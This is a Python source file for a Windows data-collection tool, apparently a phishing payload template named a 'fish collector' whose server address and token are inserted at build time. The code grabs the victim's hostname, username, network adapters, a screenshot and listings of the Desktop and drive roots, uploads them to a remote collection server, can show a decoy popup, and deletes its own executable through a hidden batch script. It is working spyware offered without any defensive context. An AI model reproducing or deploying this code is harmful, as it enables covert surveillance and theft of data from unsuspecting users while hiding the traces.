import socket
import os
import json
import uuid
import ctypes
import sys
import re
import subprocess
from datetime import datetime

# ---- CONFIG (replaced at build time) ----
SERVER_URL = "{{SERVER_URL}}"
TOKEN = "{{TOKEN}}"
SELF_DESTRUCT = "{{SELF_DESTRUCT}}"       # "true" or "false"
POPUP_ENABLED = "{{POPUP_ENABLED}}"         # "true" or "false"
POPUP_MESSAGE = "{{POPUP_MESSAGE}}"         # popup text after execution
# ------------------------------------------

if sys.platform != 'win32':
    print("This tool is designed for Windows only.")
    sys.exit(1)


def get_network_info():
    """Get per-adapter IP + MAC pairs using Windows API."""
    result = []

    MAX_ADAPTER_NAME = 256
    MAX_ADAPTER_DESC = 128

    class IP_ADDR_STRING(ctypes.Structure):
        pass

    IP_ADDR_STRING._fields_ = [
        ("next", ctypes.c_void_p),
        ("ip_address", ctypes.c_char * 16),
        ("ip_mask", ctypes.c_char * 16),
        ("context", ctypes.c_uint32),
    ]

    class IP_ADAPTER_INFO(ctypes.Structure):
        pass

    IP_ADAPTER_INFO._fields_ = [
        ("next", ctypes.c_void_p),
        ("combo_index", ctypes.c_uint32),
        ("adapter_name", ctypes.c_char * (MAX_ADAPTER_NAME + 4)),
        ("description", ctypes.c_char * (MAX_ADAPTER_DESC + 4)),
        ("address_length", ctypes.c_uint32),
        ("address", ctypes.c_uint8 * 8),
        ("index", ctypes.c_uint32),
        ("type", ctypes.c_uint32),
        ("dhcp_enabled", ctypes.c_uint32),
        ("current_ip_address", ctypes.c_void_p),
        ("ip_address_list", IP_ADDR_STRING),
        ("gateway_list", IP_ADDR_STRING),
        ("dhcp_server", IP_ADDR_STRING),
        ("have_wins", ctypes.c_uint32),
        ("primary_wins_server", IP_ADDR_STRING),
        ("secondary_wins_server", IP_ADDR_STRING),
        ("lease_obtained", ctypes.c_uint32),
        ("lease_expires", ctypes.c_uint32),
    ]

    iphlpapi = ctypes.windll.iphlpapi

    buf_size = ctypes.c_uint32(0)
    ret = iphlpapi.GetAdaptersInfo(None, ctypes.byref(buf_size))
    if ret != 111:  # ERROR_BUFFER_OVERFLOW
        return result

    buf = ctypes.create_string_buffer(buf_size.value)
    ret = iphlpapi.GetAdaptersInfo(ctypes.cast(buf, ctypes.c_void_p), ctypes.byref(buf_size))
    if ret != 0:
        return result

    ptr = ctypes.cast(buf, ctypes.c_void_p).value
    while ptr:
        adapter = ctypes.cast(ptr, ctypes.POINTER(IP_ADAPTER_INFO)).contents
        mac = ':'.join(f'{b:02X}' for b in adapter.address[:adapter.address_length])
        ip_str = adapter.ip_address_list.ip_address.decode('ascii', errors='ignore').strip()
        if ip_str and ip_str != '0.0.0.0':
            result.append({'ip': ip_str, 'mac': mac})
        ptr = adapter.next

    return result


def take_screenshot_pil():
    """Preferred screenshot method using PIL."""
    try:
        from PIL import ImageGrab
        import io as io_mod
        img = ImageGrab.grab(all_screens=True)
        buf = io_mod.BytesIO()
        img.save(buf, format='JPEG', quality=60)
        buf.seek(0)
        return buf
    except Exception:
        return None


def scan_directory(path, max_depth=1, max_files=500):
    """Scan a directory and return a tree structure."""
    result = {'path': path, 'exists': False, 'tree': [], 'error': ''}
    if not os.path.exists(path):
        result['error'] = 'path not found'
        return result

    skip_dirs = {'$Recycle.Bin', 'System Volume Information', 'Windows',
                 'Program Files', 'Program Files (x86)', 'ProgramData',
                 'Config.Msi', 'Recovery', 'MSOCache', 'PerfLogs'}

    result['exists'] = True
    file_count = 0
    try:
        for root, dirs, files in os.walk(path):
            depth = root.replace(path, '').count(os.sep)
            if depth >= max_depth:
                dirs.clear()
            dirs[:] = [d for d in dirs if not d.startswith('.') and d not in skip_dirs
                       and not d.startswith('$')]
            rel_root = os.path.relpath(root, path)

            if depth == 0:
                # Root level: dirs go into tree as folders
                for d in sorted(dirs):
                    result['tree'].append({'type': 'dir', 'name': d, 'children': []})
                for f in sorted(files):
                    full_path = os.path.join(root, f)
                    try:
                        size = os.path.getsize(full_path)
                    except Exception:
                        size = 0
                    result['tree'].append({
                        'type': 'file', 'name': f, 'size': size
                    })
                    file_count += 1
            else:
                # Subdirectory: add children to parent dir node
                parent_name = rel_root.split(os.sep, 1)[0] if os.sep in rel_root else rel_root
                parent = next((d for d in result['tree'] if d['type'] == 'dir' and d['name'] == parent_name), None)
                if parent:
                    for f in sorted(files):
                        full_path = os.path.join(root, f)
                        try:
                            size = os.path.getsize(full_path)
                        except Exception:
                            size = 0
                        parent['children'].append({
                            'type': 'file', 'name': f, 'size': size
                        })
                        file_count += 1
                        if file_count >= max_files:
                            break

            if file_count >= max_files:
                break
    except Exception as e:
        result['error'] = str(e)

    return result


def scan_target_directories():
    """Scan desktop files, C: drive, D: drive."""
    user_profile = os.environ.get('USERPROFILE', '')
    results = {}

    # Desktop
    if user_profile:
        desktop_path = os.path.join(user_profile, 'Desktop')
        results['Desktop'] = scan_directory(desktop_path)

    # C: drive root
    if os.path.exists('C:/'):
        results['C_drive'] = scan_directory('C:/')

    # D: drive root
    if os.path.exists('D:/'):
        results['D_drive'] = scan_directory('D:/')

    return results


def send_data(data, screenshot_bytes):
    """Send collected data and screenshot to server."""
    import urllib.request
    import urllib.error

    url = f"{SERVER_URL}/api/collect"
    boundary = '----FishBoundary' + uuid.uuid4().hex[:16]

    body = []
    for key, value in data.items():
        body.append(f'--{boundary}'.encode())
        body.append(f'Content-Disposition: form-data; name="{key}"'.encode())
        body.append(b'')
        body.append(str(value).encode())

    if screenshot_bytes:
        body.append(f'--{boundary}'.encode())
        body.append(
            f'Content-Disposition: form-data; name="screenshot"; filename="screenshot.jpg"'.encode()
        )
        body.append(b'Content-Type: image/jpeg')
        body.append(b'')
        body.append(screenshot_bytes.getvalue() if hasattr(screenshot_bytes, 'getvalue') else screenshot_bytes)

    body.append(f'--{boundary}--'.encode())

    payload = b'\r\n'.join(body)

    req = urllib.request.Request(url, data=payload)
    req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')

    try:
        resp = urllib.request.urlopen(req, timeout=30)
        return resp.read().decode()
    except urllib.error.URLError as e:
        print(f"Send error: {e}")
        return None
    except Exception as e:
        print(f"Send error: {e}")
        return None


def self_destruct():
    """Replace this EXE with a zero-byte file, then delete the EXE after exit."""
    try:
        # PyInstaller onefile: sys.executable points to temp dir, use sys.argv[0]
        exe_path = os.path.abspath(sys.argv[0])
        if not exe_path.lower().endswith('.exe'):
            return
        dir_name = os.path.dirname(exe_path)

        # Write a zero-byte placeholder without extension
        random_name = uuid.uuid4().hex[:12]
        fake_path = os.path.join(dir_name, random_name)
        with open(fake_path, 'wb') as f:
            f.write(b'')

        # Batch script to delete the EXE after this process exits
        # It loops until the EXE file is unlocked, then deletes itself
        bat_path = os.path.join(os.environ.get('TEMP', '.'), f'_c{uuid.uuid4().hex[:6]}.bat')
        with open(bat_path, 'w') as f:
            f.write(f'@echo off\r\n'
                    f':loop\r\n'
                    f'del /f "{exe_path}" >nul 2>&1\r\n'
                    f'if exist "{exe_path}" (\r\n'
                    f'    timeout /t 1 /nobreak >nul\r\n'
                    f'    goto loop\r\n'
                    f')\r\n'
                    f'del "%~f0" >nul 2>&1\r\n')

        subprocess.Popen(
            ['cmd.exe', '/c', bat_path],
            creationflags=0x08000000,  # CREATE_NO_WINDOW
            close_fds=True,
        )
        print(f"[*] Self-destruct: {exe_path} -> {fake_path}")
    except Exception as e:
        print(f"[!] Self-destruct failed: {e}")


def show_popup():
    """Show a message box with configured text."""
    try:
        ctypes.windll.user32.MessageBoxW(0, POPUP_MESSAGE, '提示', 0x30)  # MB_ICONWARNING
    except Exception:
        pass


def main():
    print("[*] Starting fish collector...")
    print(f"[*] Token: {TOKEN}")
    print(f"[*] Server: {SERVER_URL}")

    hostname = socket.gethostname()
    username = os.environ.get('USERNAME', 'unknown')

    # Per-adapter IP + MAC
    net_info = get_network_info()
    ip_list = '\n'.join(f"{ni['ip']}  ({ni['mac']})" for ni in net_info)

    print(f"[*] Hostname: {hostname}")
    print(f"[*] Username: {username}")
    print(f"[*] Network:\n{ip_list}")

    # Take screenshot
    print("[*] Taking screenshot...")
    screenshot_bytes = take_screenshot_pil()
    if screenshot_bytes:
        print(f"[*] Screenshot captured ({screenshot_bytes.getbuffer().nbytes} bytes)")
    else:
        print("[!] Screenshot failed")

    # Scan directories
    print("[*] Scanning directories (Desktop, C:\, D:\)...")
    dir_info = scan_target_directories()

    data = {
        'token': TOKEN,
        'hostname': hostname,
        'username': username,
        'ip_address': ip_list,
        'mac_address': json.dumps(net_info, ensure_ascii=False),
        'directory_info': json.dumps(dir_info, ensure_ascii=False),
        'timestamp': datetime.now().isoformat(),
    }

    print("[*] Sending data to server...")
    result = send_data(data, screenshot_bytes)
    if result:
        print(f"[*] Server response: {result}")
    else:
        print("[!] Failed to send data")

    # Show popup if enabled
    if POPUP_ENABLED.lower() == 'true':
        show_popup()

    # Self-destruct if configured
    if SELF_DESTRUCT.lower() == 'true':
        self_destruct()

    print("[*] Done.")


if __name__ == '__main__':
    main()
